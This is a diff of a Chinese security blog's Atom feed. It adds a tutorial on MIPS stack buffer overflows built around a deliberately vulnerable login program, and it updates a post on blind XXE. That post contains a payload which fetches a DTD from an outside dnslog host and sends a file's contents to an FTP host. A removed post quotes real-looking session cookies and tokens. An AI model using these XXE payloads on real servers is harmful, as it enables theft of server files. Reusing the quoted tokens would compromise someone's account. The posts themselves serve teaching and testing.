@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://xdxd.love/"/>
-  <updated>2016-09-08T07:34:55.000Z</updated>
+  <updated>2016-09-13T07:12:48.000Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -15,12 +15,66 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title><![CDATA[mips架构缓冲区溢出学习一]]></title>
+    <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
+    <id>http://xdxd.love/2016/09/08/一个简单的mips架构缓冲区溢出/</id>
+    <published>2016-09-08T07:54:58.000Z</published>
+    <updated>2016-09-13T07:12:48.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="缓冲区溢出">缓冲区溢出</h2><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)</p>
+<p>mips的编译调试环境搭建参考<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a></p>
+<p>示例代码：</p>
+<pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span>
+<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{
+    <span class="keyword">char</span> username[<span class="number">100</span>],password[<span class="number">100</span>];
+    <span class="built_in">printf</span>(<span class="string">"\nUsername: "</span>);
+    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, username);
+    <span class="built_in">printf</span>(<span class="string">"\nPassword: "</span>);
+    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);
+    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(username, <span class="string">"Turing"</span>) &amp;&amp; !<span class="built_in">strcmp</span>(password, <span class="string">"1234"</span>)) {
+        <span class="built_in">printf</span>(<span class="string">"Welcome to the pediy server\n"</span>);
+    }<span class="keyword">else</span> {
+        <span class="built_in">printf</span>(<span class="string">"Login failed\nGoodbye!\n"</span>);
+    }
+    <span class="keyword">return</span> <span class="number">0</span>;
+}
+</code></pre><p>编译代码生成可执行文件。</p>
+<pre><code><span class="regexp">/root/</span>buildroot-<span class="number">2016.05</span><span class="regexp">/output/</span>host<span class="regexp">/usr/</span>bin/mipsel-linux-gcc pediy.c -o pediy -<span class="keyword">static</span>
+</code></pre><p><img src="/images/mipsoverflow1.png" alt=""><br>可以看到这个程序的逻辑比较简单，她要求用户输入一个用户名和密码，然后分别存储在两个数组里。然后检查用户名和密码是否是Turing和1234，如果正确，就打印欢迎信息，如果错误就返回登录失败的信息。</p>
+<p>对于一个正常的应用来说，100个字符的用户名应该足够了。但是如果有人输入了超过100个字符的用户名会有什么情况发生呢。scanf并不会去检查边界，而是盲目的接受所有的字符。</p>
+<p>我们来测试一下输入超过100个字符的用户名。<br><img src="/images/mipsoverflow2.png" alt=""><br>可以看到程序正常的运行结束之后抛出了一个提示：</p>
+<pre><code>qemu: uncaught <span class="keyword">target</span> signal 11 (Segmentation fault) - core dumped
+Segmentation fault
+</code></pre><p>使用如下命令运行程序，用ida进行调试：</p>
+<pre><code>chroot . ./qemu-mipsel-<span class="keyword">static</span> -g <span class="number">1234</span> ./pediy
+</code></pre><p>运行程序程序，输入超长的用户名，发现程序运行0x61616161处的指令时发生了崩溃，引发了段故障错误。崩溃现场如图：</p>
+<p><img src="/images/mipsoverflow3.png" alt=""></p>
+<p>可以看到stack view中栈空间充满了61616161，而且寄存器$RA,$FP的值都是61616161，61是我们输入的用户名字母a的16进制编码。所以，超长的字符串劫持了程序的执行流程，让程序执行到了0x61616161这个我们可控的地址继续执行，而这个地址使我们随意输入的，从而导致了程序崩溃。</p>
+<p>具体的mips指令架构这里就不做介绍了。可以通过反汇编查看main函数的栈空间布局。<br><img src="/images/mipsoverflow4.png" alt=""></p>
+<p>基本如下图所示：<br><img src="/images/mipsoverflow5.png" alt=""><br>username和password都分配了100个字节的空间，后面是上一个函数的栈指针和保存的$ra返回地址，让当前函数结束运行之后，CPU会从$ra处开始执行命令，而基础器$ra的值是从栈空间里保存的$ra处恢复的。</p>
+<p>当函数运行结束之后，由于我们输入了超长的用户名，所以栈空间的数据就变成了如下这样：<br><img src="/images/mipsoverflow6.png" alt=""><br>用户名的数据覆盖了栈上其他的数据，所以当函数运行结束，寄存器$ra从栈上恢复地址的时候，得到的是被覆盖了的地址。然后程序会从0x61616161处开始执行，这会导致不可预料的后果，大部分情况都会导致内存访问违规。</p>
+<h2 id="漏洞利用">漏洞利用</h2><p>既然我们可以控制程序从一个指定的地址开始执行命令，那么如果我们知道一个以前没有权限执行的危险命令的地址，就可以通过溢出的方式欺骗程序去执行这个命令。在这个例子中我们可以尝试在没有成功登陆的情况下执行成功登陆之后的一些指令。当然要实现还是有不少苦难的，我们需要知道目标指令的地址，很可能看了几个小时的汇编依然一无所获。</p>
+<p>但是既然我们控制username和password参数，可以尝试将需要执行的代码放到username的位置，然后将$ra返回地址指向我们控制的数据的地址。如下所示：</p>
+<p><img src="/images/mipsoverflow7.png" alt=""></p>
+<h2 id="参考资料">参考资料</h2><p><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/" target="_blank" rel="external">A simple buffer overflow exploit (MIPS architecture)</a><br>《解密家用路由器0day漏洞挖掘技术》<br><a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="缓冲区溢出">缓冲区溢出</h2><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)]]>
+    </summary>
+    
+      <category term="mips 溢出" scheme="http://xdxd.love/tags/mips-%E6%BA%A2%E5%87%BA/"/>
+    
+      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
     <title><![CDATA[一个blind XXE漏洞利用工具XXEinjector]]></title>
     <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AAblind-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
     <id>http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/</id>
     <published>2016-09-08T02:22:01.000Z</published>
-    <updated>2016-09-08T07:34:55.000Z</updated>
-    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a></p>
+    <updated>2016-09-09T01:58:19.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a><br><a href="https://www.92aq.com/2016/01/31/xxeinjector-xxe.html" target="_blank" rel="external">XXEinjector – XXE自动化测试工具</a></p>
 <h2 id="漏洞探测">漏洞探测</h2><p>关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。<br>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
 <p>测试payload:</p>
 <pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://sss.5510eb.dnslog.info/file.dtd"&gt;%remote;]&gt;</span>
@@ -36,7 +90,7 @@
 &lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% int "&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://xxxxxxx:21/%payl;'&gt;"&gt;</span>
 </code></pre><p>然后ftp就会接受到hosts文件数据。</p>
 <p>使用提取的payload用burp测试可以获取数据。<br><img src="/images/onexxe2.png" alt=""></p>
-<h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet#XMLReader)，根据相应的库的方式禁用外部实体解析。</p>
+<h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet)，根据相应的库的方式禁用外部实体解析。</p>
 <h2 id="备注">备注</h2><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
 ]]></content>
     <summary type="html">
@@ -1033,76 +1087,6 @@ $ sudo pip install mitmproxy
       <category term="mitmproxy" scheme="http://xdxd.love/tags/mitmproxy/"/>
     
       <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[sqlalchemy保存字典对象报语法错误]]></title>
-    <link href="http://xdxd.love/2016/01/28/sqlalchemy%E8%AE%B0%E5%BD%95%E6%89%A7%E8%A1%8Csql/"/>
-    <id>http://xdxd.love/2016/01/28/sqlalchemy记录执行sql/</id>
-    <published>2016-01-28T09:08:12.000Z</published>
-    <updated>2016-01-29T02:34:13.000Z</updated>
-    <content type="html"><![CDATA[<h1 id="问题分析">问题分析</h1><p>使用sqlalchemy的过程中,遇到写数据库的时候报语法错误，相关代码如下：</p>
-<pre><code># 定义requests对象,存储HTTP请求的所有信息<span class="value">:
-class <span class="function">Requests</span>(Base):
-    # 表的名字:
-    __tablename__ = <span class="string">'requests'</span>
-    # 表的结构:
-    id = <span class="function">Column</span>(<span class="function">Integer</span>(), primary_key=True)
-    # scheme = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
-    method = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">200</span>))
-    url = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">2000</span>))
-    headers = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
-    # cookies = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
-    content = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
-    # query = <span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
-    timestamp_start = <span class="function">Column</span>(<span class="function">String</span>(<span class="number">2000</span>))
-    urlencoded_form=<span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
-    multipart_form=<span class="function">Column</span>(<span class="function">Text</span>(<span class="number">20000</span>))
-    sqlmap=<span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
-    xss=<span class="function">Column</span>(<span class="function">String</span>(<span class="number">20</span>))
-
-# 将请求信息写入数据库
-def <span class="function">save_request</span>(flow):
-    newrequest = <span class="function">Requests</span>(
-            # scheme=flow.request.scheme,
-            method=flow.request.method,
-            url=flow.request.url,
-            headers=<span class="function">str</span>(flow.request.headers.__dict__),
-            # headers={<span class="string">'fields'</span>: [[<span class="string">'Host'</span>, <span class="string">'zone.wooyun.org'</span>], [<span class="string">'Proxy-Connection'</span>, <span class="string">'keep-alive'</span>], [<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>], [<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>], [<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>], [<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span>], [<span class="string">'Referer'</span>, <span class="string">'http://zone.wooyun.org/content/24881'</span>], [<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate, sdch'</span>], [<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2'</span>], [<span class="string">'Cookie'</span>, <span class="string">'__cfduid=dc40888efca4ab0ff91186dc39428d9451452910746; wy_uid=5216UsFxwcFbseAhJt2wKwW3D3TWpih1g71JAjeIlpCT; wy_pwd=8c96%2BGWnQmu1BRR1RePbtZrkAZ6bY8HvlPtgcggYQmaideN8%2F08EAzHsV1XKQ72ZwX7q%2BxN4FJgnfUHorw; wy_token=192c2fd47fa5d03123ced3320c7e580c; PHPSESSID=e0e6vqec509trlqu7tv1lfeu70; bdshare_firstime=1453095346906; login_type=d8d1the3gNwSvY8dSI2oIhzdLszQ8nsd2ne%2Fl6JY; __ads_session=xk9roUMxqgiiIx0CggA=; Hm_lvt_c12f88b5c1cd041a732dea597a5ec94c=1453453560; Hm_lpvt_c12f88b5c1cd041a732dea597a5ec94c=1453876852; Hm_lvt_3faf3a47435cc512f3b86dc12af100d0=1453682212; Hm_lpvt_3faf3a47435cc512f3b86dc12af100d0=1453882158'</span>], [<span class="string">'AlexaToolbar-ALX_NS_PH'</span>, <span class="string">'AlexaToolbar/alxg-3.3'</span>]]},
-            # cookies=flow.request.cookies,
-            content=flow.request.content,
-            # query=flow.request.query,
-            timestamp_start=flow.request.timestamp_start,
-            # id=<span class="function">get_md5_value</span>(flow.request.url+flow.request.content+<span class="function">str</span>(flow.request.timestamp_start))
-            urlencoded_form=flow.request.urlencoded_form,
-            multipart_form=flow.request.multipart_form,
-    )
-    session = <span class="function">DBSession</span>()
-    session.<span class="function">add</span>(newrequest)
-    session.<span class="function">commit</span>()
-    session.<span class="function">close</span>()</span>
-</code></pre><p>当写入的数据类型为字典时，报语法错误。</p>
-<pre><code><span class="name">ProgrammingError</span>: (<span class="name">_mysql_exceptions</span>.<span class="name">ProgrammingError</span>) (<span class="number">1064</span>, <span class="string">'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'fields\': "((\'Host\',\'dongweiming.github.io\'),(\'Proxy-Connection\',\'keep-alive\'),(\' at line 1'</span>) [<span class="name">SQL</span>: <span class="atom">u</span><span class="string">'INSERT INTO requests (method, url, headers, content, timestamp_start, urlencoded_form, multipart_form, sqlmap, xss) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)'</span>] [<span class="atom">parameters</span>: (<span class="string">'GET'</span>, <span class="string">'http://dongweiming.github.io/blog/archives/how-to-use-celery/'</span>, {<span class="string">'fields'</span>: [[<span class="string">'Host'</span>, <span class="string">'dongweiming.github.io'</span>], [<span class="string">'Proxy-Connection'</span>, <span class="string">'keep-alive'</span>], [<span class="string">'Cache-Control'</span>, <span class="string">'max-age=0'</span>], [<span class="string">'Accept'</span>, <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>], [<span class="string">'Upgrade-Insecure-Requests'</span>, <span class="string">'1'</span>], [<span class="string">'User-Agent'</span>, <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36'</span>], [<span class="string">'Referer'</span>, <span class="string">'https://www.google.com/'</span>], [<span class="string">'Accept-Encoding'</span>, <span class="string">'gzip, deflate, sdch'</span>], [<span class="string">'Accept-Language'</span>, <span class="string">'zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,fr;q=0.2'</span>], [<span class="string">'Cookie'</span>, <span class="string">'__utma=221486477.1712369208.1453863719.1453863719.1453972410.2; __utmc=221486477; __utmz=221486477.1453972410.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)'</span>], [<span class="string">'AlexaToolbar-ALX_NS_PH'</span>, <span class="string">'AlexaToolbar/alxg-3.3'</span>], [<span class="string">'If-Modified-Since'</span>, <span class="string">'Tue, 26 Jan 2016 10:36:35 GMT'</span>]]}, <span class="string">''</span>, <span class="number">1454034516.300893</span>, <span class="name">None</span>, <span class="name">None</span>, <span class="name">None</span>, <span class="name">None</span>)]
-</code></pre><p>一开始看到语法错误，感觉有SQL注入啊。可是sqlalchemy应该是用预编译的方式，报错信息也显示了，确实是采用了预编译的方式。</p>
-<pre><code>u'<span class="type">INSERT</span> <span class="type">INTO</span> requests (<span class="keyword">method</span>, url, headers, content, timestamp_start, urlencoded_form, multipart_form, sqlmap, xss) <span class="type">VALUES</span> (%s, %s, %s, %s, %s, %s, %s, %s, %s)
-</code></pre><p>使用如下python代码可以记录sqlalchemy执行的sql语句。</p>
-<pre><code># <span class="tag">logging</span><span class="class">.basicConfig</span>(filename=<span class="string">'db.log'</span>)
-# <span class="tag">logging</span><span class="class">.getLogger</span>(<span class="string">'sqlalchemy.engine'</span>)<span class="class">.setLevel</span>(logging.INFO)
-</code></pre><p>经过调试分析发现，如果传入类型为字典，就会导致</p>
-<pre><code>ProgrammingError: (_mysql_exceptions.ProgrammingError) (1064, 'You have <span class="keyword">an</span> <span class="keyword">error</span> <span class="keyword">in</span> your SQL <span class="keyword">syntax</span>; 
-</code></pre><p>错误。</p>
-<p>sqlalchemy的bug？是否有可能造成sql注入？</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<h1 id="问题分析">问题分析</h1><p>使用sqlalchemy的过程中,遇到写数据库的时候报语法错误，相关代码如下：</p>
-<pre><code># 定义requests对象,存储HTTP请求的所有信息<span class="value">:
-class <sp]]>
-    </summary>
-    
-      <category term="python" scheme="http://xdxd.love/tags/python/"/>
-    
-      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
